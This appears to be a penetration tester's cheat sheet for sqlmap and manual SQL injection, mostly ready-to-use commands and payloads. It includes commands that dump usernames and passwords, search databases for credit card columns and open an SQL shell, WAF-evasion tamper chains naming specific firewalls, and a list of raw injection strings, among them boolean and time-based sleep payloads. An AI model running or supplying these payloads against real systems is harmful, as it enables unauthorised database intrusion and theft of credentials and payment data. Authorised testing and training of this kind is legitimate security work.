https://github.com/sqlmapproject/sqlmap/wiki/Usage

Use Prefix and Suffix for more challenging attacks
---------------------------------------------
```
# See example 9 https://pentesterlab.com/exercises/web_for_pentester_II/course
# Example Chinese char set https://www.fileformat.info/info/charset/GBK/list.htm
sqlmap -r ./sqlmap-03.txt --level=5 --risk=3 --batch --prefix=%bf%27 --dbms=mysql
```
Useful Switches
----------------
```
–-crawl=4 (depth of pages to crawl)
--proxy=http://127.0.0.1:8080
-–identify-waf
--dbms=mssql|mysql|mysql 4|mysql 5|oracle|pgsql|sqlite|sqlite3|access|firebird|maxdb|sybase|BD2?
--prefix=?????? - see below
--suffix=?????? - see below
-D DatabaseName --search -C password
--search -C password
--search -C credit
--search -C creditcard
--list-tampers
-v 0-6
--force-ssl
--random-agent
--flush-session

# SQL injection techniques to use.
# Valid: a string composed by B, E, U, S, T and Q where:
# B: Boolean-based blind SQL injection
# E: Error-based SQL injection
# U: UNION query SQL injection
# S: Stacked queries SQL injection
# T: Time-based blind SQL injection
# Q: Inline SQL injection
# Example: ES (means test for error-based and stacked queries SQL
# injection types only)
# Default: BEUSTQ (means test for all SQL injection types - recommended)
tech = BEUSTQ
```

Useful if the dev is filtering/removing single quotes
-------------
```
# delimit ' by escaping with \ this will break the select statement
examples
username=\'&password=mypassword1*#
username=%5C%27&password=password1*%23
```

SQLite sample 
-------------
```
# NOTE: Notice the -D parameter is "SQLite_masterdb", this appears to be the default database for SQLite. 
# Other possible -D parameter could be "main"
sqlmap -r ./sqlmap-01.txt --dbms=SQLite --batch --level=5 --risk=3 -D SQLite_masterdb -T users -C admin,password,username --dump

## Get --sql-shell
sqlmap -r ./sqlmap-01.txt --dbms=SQLite --batch --level=5 --risk=3 -D SQLite_masterdb -T users -C admin,password,username --dump --sql-shell

# List tables
SELECT name FROM sqlite_master WHERE type='table';
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'

# Show tables and columns
SELECT sql FROM sqlite_master
```

SQLMap Tamper Data
-------------
```
sqlmap -u 'http://www.site.com:80/search.cmd?form_state=1’ --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```
General Tamper Data
```
tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
MSSQL
```
tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,percentage,randomcase,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
MYSQL
```
tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```
SQLInjection Basic Stuff
-------------
```
' or 1=1 --
' or 1=1 or '1'='1
# If single quotes are blocked try delimiting them
/' or 1=1 or '1'='1
/' or 1=1 --
'"
105 OR 1=1
" or ""="
'%2b(select*from(select(sleep(20)))a)%2b'%bf%27
'+(select*from(select(sleep(5)))a)+'
999999 or 1=1 or 1=1
' or 1=1 or '1'='1
" or 1=1 or "1"="1
999999) or 1=1 or (1=1
') or 1=1 or ('1'='1
") or 1=1 or ("1"="1
999999)) or 1=1 or ((1=1
')) or 1=1 or (('1'='1
")) or 1=1 or (("1"="1
999999))) or 1=1 or (((1
'))) or 1=1 or ((('1'='1
"))) or 1=1 or ((("1"="1
(select 99999999 from pg_sleep(15)) as test
(select 99999999 from pg_sleep(15))
9999'||(select 99999999 from pg_sleep(15))||'9999
9999"||(select 99999999 from pg_sleep(15))||"9999
extractvalue('<xml>',concat("/",(select version())))
```
Interesting items that can be used to prefix and suffix attacks
---------------------
```
prefix='('
prefix='\xBF'''
prefix='%bf%27'
prefix=''''
# Attack using the middle of the url
sqlmap.py -p host -u "example.com?host=" --prefix "http://anotherexample.com?bar=1" --suffix "&restoftheurl=whatever"
```
Sqlmap quick cheat sheet
-------------
```
sqlmap -u ${url}
sqlmap -u ${url} --dbs
sqlmap -u ${url} -D ${database} --tables
sqlmap -u ${url} -D ${database} -T ${table} --columns
sqlmap -u ${url} -D ${database} -T ${table} -C ${col1},${col2} --dump
```
